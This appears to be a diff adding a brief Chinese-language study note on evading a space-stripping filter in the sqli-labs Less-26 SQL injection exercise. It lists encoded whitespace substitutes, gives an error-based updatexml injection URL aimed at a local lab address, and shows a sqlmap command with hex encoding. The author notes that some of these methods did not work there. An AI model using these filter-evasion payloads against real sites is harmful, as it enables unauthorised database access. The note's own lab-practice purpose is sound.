@@ -1,0 +1,17 @@
+绕过去除空格的策略：
+编码：采用hex、urlencode编码
+空格		%a0（%20表示半角空格，代码中常用;%a0表示不间断空格，主要用于office，让一个单词在结尾处不会换行显示）
+TAB键（水平）	%09
+新建一行		%0a
+return功能	%0d
+TAB键（垂直）	%0b
+
+或者用()绕过
+
+但在解Less-26中以上这些失效，网上有结实为
+http://10.0.2.15/sqli/Less-26/?id=0'+||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'1'='1
+
+使用sqlmap进行sql注入
+sqlmap -u URL --hex --batch --current-db
+--hex 将对应提交的payload进行hex编码，从而使得可以绕过去除空格的情况
+但是实验了一下，在Less-26中，用该方法失败了，没有搜索到可以使用的方法
